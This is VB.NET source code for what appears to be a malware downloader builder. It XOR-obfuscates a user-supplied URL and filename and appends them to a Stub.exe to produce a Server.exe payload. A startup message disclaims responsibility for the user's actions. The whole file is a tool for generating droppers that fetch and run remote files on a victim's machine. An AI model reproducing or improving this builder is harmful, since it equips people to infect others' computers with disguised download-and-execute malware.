Imports System.IO
Public Class Form1
    Dim stub, text1, text2 As String
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        System.Diagnostics.Process.Start("http://www.natespages.ucoz.com")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            MsgBox("Oops, Looks like you forgot the URL!")
            Exit Sub
        End If
        If TextBox2.Text = "" Then
            MsgBox("Oops, Looks like you forgot the filename!")
            Exit Sub
        End If

        Dim i As Short
        Dim KeyChar As Integer
        KeyChar = Asc("++")
        For i = 1 To Len(TextBox1.Text)
            text1 &= Chr(KeyChar Xor Asc(Mid(TextBox1.Text, i, 1)))
        Next
        KeyChar = Asc("++")
        For i = 1 To Len(TextBox2.Text)
            text2 &= Chr(KeyChar Xor Asc(Mid(TextBox2.Text, i, 1)))
        Next
        Const FileSplit = "@72389@"
        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        Stub = Space(LOF(1))
        FileGet(1, Stub)
        FileClose(1)
        If File.Exists("server.exe") Then
            My.Computer.FileSystem.DeleteFile("server.exe")
        End If
        FileOpen(1, Application.StartupPath & "\Server.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2)
        FileClose(1)
        MsgBox("Server.exe file created!" + vbNewLine + "Bye Bye!")

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        MsgBox("The creator will not be held responsible for your actions!" + vbNewLine + _
               vbNewLine + "Enjoy!")
    End Sub
End Class
